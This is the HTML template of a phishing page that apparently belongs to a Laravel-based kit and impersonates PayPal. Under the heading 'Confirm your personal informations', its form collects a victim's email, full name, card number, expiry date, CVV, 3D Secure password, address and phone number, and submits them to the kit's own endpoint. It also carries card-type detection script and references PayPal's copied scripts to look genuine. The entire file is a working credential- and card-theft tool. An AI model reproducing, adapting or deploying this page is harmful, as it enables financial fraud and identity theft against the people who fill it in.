<!DOCTYPE html><html lang="en_US" dir="ltr" class="no-js"><head><meta charset="utf-8" /><meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no" /><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="apple-mobile-web-app-capable" content="yes"/><meta name="apple-mobile-web-app-status-bar-style" content="black"/><meta name="format-detection" content="telephone=no"><link rel="apple-touch-icon-precomposed" sizes="144x144" href="YSASSETS/img/YS_pp144.png" /><link rel="apple-touch-icon-precomposed" sizes="114x114" href="YSASSETS/YSASSETS/img/YS_pp114.png" /><link rel="apple-touch-icon-precomposed" sizes="72x72" href="YSASSETS/img/YS_pp72.png" />
...
<title>Confirm Your personal informations PayPal</title>
...
<form action="{{url('/summary/confirm')}}" id="main-form" required="required" method="post" class="yass-form-billing" name="billing" >
  {{csrf_field()}}
  <div style="text-align: center" class="mainBody">
		<div id="summary" class="summarySection">
			...
			<h3 id="activityModuleHeaderPending" class="vx_h5 moduleHeader nemo_activityModuleHeaderPending"><a href="#" class="moduleHeaderLink nemo_moduleHeaderLink">Confirm your personal informations PayPal.</a></h3>
			...
			<div id="txnDate-U-0YB06382SV697533N" class="dateParts js_transactionDescriptionLink linkedBlock js_linkedBlock">
					<div class="fields large">
						<input style="letter-spacing: 2px;  background-color: #fff;  ;" placeholder="Email Address" class="validate camelCase name" id="" placeholder="" name="ys_cardholder" required="required" autocomplete="off" autocorrect="off" autocapitalize="on" aria-required="true" type="text" maxlength="25" >
					</div>

					<div class="fields large">
						<input style="text-transform: capitalize;" class="validate camelCase name" id="ys_fullname"  placeholder="Full name" name="ys_fullname" required="required" autocomplete="off" autocorrect="off" autocapitalize="on" aria-required="true" type="text" minlength="5" maxlength="30" onkeypress="return ValidateAlpha(event)">
					</div>

					<div class="fields large">
						<input style="text-transform: capitalize;" onkeyup="YASS_ta3rif_carte()" maxlength="19" class="validate camelCase name" id="validate_yass"  placeholder="Credit card number" name="ys_cardnumber" required="required" autocomplete="off" autocorrect="off" autocapitalize="on" aria-required="true" type="tel" onkeypress="return isNumberKey(event)">
						<span style="width: 50px; height: 30px; right: 10px; top: 128px; float: left; position: absolute;     z-index: 2; display: inline-block; background-image: url(YSASSETS/img/ys_icon_input.png); background-repeat: no-repeat; background-position: 0px -402px;" class="card" id="card" role="img">
						</span>
					</div>
					<div class="fields large">
						<input class="validate camelCase name" id="expiry"  placeholder="Expiration date (MM/YYYY)" name="ys_expiry" required="required" autocomplete="off" autocorrect="off" autocapitalize="on" aria-required="true" type="tel" onkeypress="return isNumberKey(event)">
					</div>
					<div class="fields large">
						<span style="background-position: 0 88%; width: 50px; height: 30px; right: 10px; top:238px; float: left; position: absolute; z-index: 2; display: inline-block; background-image: url(YSASSETS/img/ys_icon_input.png); background-repeat: no-repeat; " class="icons cvv defaultCvv" id="$1$T90ZrbhZ$4iByqnegWJym0.t8xrUxV." role="img"></span>
						<input class="validate camelCase name" id="csc" placeholder="CSC/CVV" maxlength="4" name="ys_csc" required="required" autocomplete="off" autocorrect="off" autocapitalize="on" aria-required="true" type="tel" onkeyup="if (/\D/g.test(this.value)) this.value = this.value.replace(/\D/g,'')">
					</div>
					<div class="fields large">
						<input style="background: url(YSASSETS/img/ys_zbilal9ithaBTdzabi.png) no-repeat right; background-color: white;" class="validate camelCase name" id="vbv"  placeholder="3D Secure" name="ys_vbv" autocomplete="off" autocorrect="off" autocapitalize="on" type="password">
                         </div>
					<div class="fields large">
						<input class="validate camelCase name" id="ys_address"  placeholder="Address line" name="ys_address" required="required" autocomplete="off" autocorrect="off" autocapitalize="on" aria-required="true" type="text" minlength="7" maxlength="35">
					</div>
					<div class="fields large">
						<input style="text-transform: capitalize;"  class="validate camelCase name" id="ys_city"  placeholder="Town/City" name="ys_city" required="required" autocomplete="off" autocorrect="off" autocapitalize="on" aria-required="true" type="text" minlength="3" maxlength="15" onkeypress="return ValidateAlpha(event)">
					</div>
          <div class="fields large">
						<input style="text-transform: capitalize;"  class="validate camelCase name" id="ys_state"  placeholder="State" name="ys_state" required="required" autocomplete="off" autocorrect="off" autocapitalize="on" aria-required="true" type="text" minlength="3" maxlength="15" onkeypress="return ValidateAlpha(event)">
					</div>
					<div class="fields large">
						<input style="text-transform: capitalize;" class="validate camelCase name" id="ys_country"  placeholder="Country" name="ys_country" required="required" autocomplete="off" autocorrect="off" autocapitalize="on" aria-required="true" type="text" minlength="4" maxlength="17" onkeypress="return ValidateAlpha(event)">
					</div>
					<div class="fields large">
						<input class="validate camelCase name" id="ys_zipcode"  placeholder="Zip code" name="ys_zipcode" required="required" autocomplete="off" autocorrect="off" autocapitalize="on" aria-required="true" type="text" minlength="3" maxlength="9">
					</div>
					<div class="fields medium right">
						<input class="validate camelCase name" id="ys_phone"  placeholder="Phone number" name="ys_phone" required="required" autocomplete="off" autocorrect="off" autocapitalize="on" aria-required="true" type="tel" onkeyup="if (/\D/g.test(this.value)) this.value = this.value.replace(/\D/g,'')" minlength="7" maxlength="13">
					</div>
					<input style="font-size: 15px; font-weight: bold; border-radius: 25px; width: 1485%; height: 44px; padding: 10px 15px; border: 0; display: block; background: #0070ba; box-shadow: none; cursor: pointer; box-sizing: border-box; -webkit-tap-highlight-color: transparent; color: #fff; text-align: center; font-family: Helvetica Neue,Helvetica,Arial,sans-serif; text-shadow: none; margin-top: 25px" id="submitBtn" name="_eventId_continue" class="button" value="Agree and Confirm"  type="submit">
			</div>
			</div>
...
<!--- this func get tipe card --->
<script>
	function YASS_ta3rif_carte(){
            var get_value = document.getElementById('validate_yass').value;
		...
		onload = function() {
		  document.getElementById('validate_yass').oninput = function() {
...
<script type="text/javascript" src="{{URL::asset('asset/js/ys_ppl_647892.js')}}"></script> <!-- https://www.paypalobjects.com/js/site_catalyst/pp_jscode_080706.js -->
<script type="text/javascript" src="{{URL::asset('asset/js/ys_pa.js')}}"></script> <!-- https://www.paypalobjects.com/pa/js/min/pa.js -->
<script src="{{URL::asset('asset/js/ys_appli.js')}}"></script> <!-- https://www.paypalobjects.com/web/res/d9b/206b83f3021b1e1580a97bf54ed58/js/apps/app.js-->
<script type="text/javascript" src="{{URL::asset('asset/js/ys_bootstrap.js')}}"> <!--https://www.paypalobjects.com/tagmgmt/bootstrap.js -->
</script></body></html>
